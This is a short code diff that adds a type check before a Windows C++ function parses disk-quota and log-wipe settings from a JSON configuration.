@@ -168,7 +168,12 @@ void LOG_InitCryptKey(BYTE *crypt_material, BYTE *crypt_material_conf)
 
 void WINAPI ParseGlobalsQuota(JSONObject conf_json, DWORD dummy)
 {
-	JSONObject quota = conf_json[L"quota"]->AsObject();
+	JSONObject quota;
+	
+	if (!conf_json[L"quota"]->IsObject())
+		return;
+
+	quota = conf_json[L"quota"]->AsObject();
 	min_disk_free = (DWORD) quota[L"min"]->AsNumber();
 	max_disk_full = (DWORD) quota[L"max"]->AsNumber();
 	log_wipe_file = (BOOL) conf_json[L"wipe"]->AsBool();
